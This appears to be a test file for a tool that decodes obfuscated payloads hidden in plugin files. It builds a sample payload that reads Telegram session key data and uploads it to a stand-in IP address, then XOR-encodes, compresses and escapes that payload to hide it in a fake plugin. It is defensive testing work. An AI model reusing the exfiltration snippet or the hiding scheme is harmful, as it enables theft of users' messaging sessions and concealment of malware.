#!/usr/bin/env python3
"""Round-trip check for scripts/inspect_plugin_payload.py (no execution of payloads)."""
import base64
import html
import subprocess
import sys
import tempfile
import textwrap
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
TOOL = ROOT / "scripts/inspect_plugin_payload.py"

sys.path.insert(0, str(ROOT / "scripts"))
import inspect_plugin_payload as tool  # noqa: E402

KEY = bytes([0x3B, 0x84, 0x65, 0x61, 0x21, 0x3E, 0xDB, 0xF1])
assert tool.parse_key_literal(r"b';\x84ea!>\xdb\xf1'") == KEY
assert tool.DEFAULT_KEY == KEY

PAYLOAD = textwrap.dedent(
    """
    import os, urllib.request
    HOST = "203.0.113.7"
    def go():
        data = open(os.path.expanduser("~/.tdata/key_datas"), "rb").read()
        urllib.request.urlopen("http://%s/up" % HOST, data=data)
    """
).lstrip()

xored = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(PAYLOAD.encode()))
blob = base64.b85encode(zlib.compress(xored)).decode()
escaped = html.escape(blob, quote=False)
wrapped = "\n".join(escaped[i : i + 60] for i in range(0, len(escaped), 60))
plugin = '__id__ = "x"\n_CACHE_KEY = b\';\\x84ea!>\\xdb\\xf1\'\n_CACHE_BLOB = "%s"\n' % wrapped

with tempfile.TemporaryDirectory() as tmp:
    src = Path(tmp) / "sample.plugin"
    src.write_text(plugin, encoding="utf-8")
    out = Path(tmp) / "decoded.py"
    res = subprocess.run(
        [sys.executable, str(TOOL), str(src), "--out", str(out), "--extract-strings"],
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, res.stderr
    assert "203.0.113.7" in res.stdout
    assert "данные сессии Telegram" in res.stdout
    assert out.read_text(encoding="utf-8").rstrip().endswith("data=data)")

# Clean plugin source without a payload must fail loudly instead of guessing.
with tempfile.TemporaryDirectory() as tmp:
    plain = Path(tmp) / "plain.plugin"
    plain.write_text('__id__ = "plain"\nprint("hi")\n', encoding="utf-8")
    res = subprocess.run([sys.executable, str(TOOL), str(plain)], capture_output=True, text=True)
    assert res.returncode == 1, res.stdout

print("inspect_plugin_payload: OK")
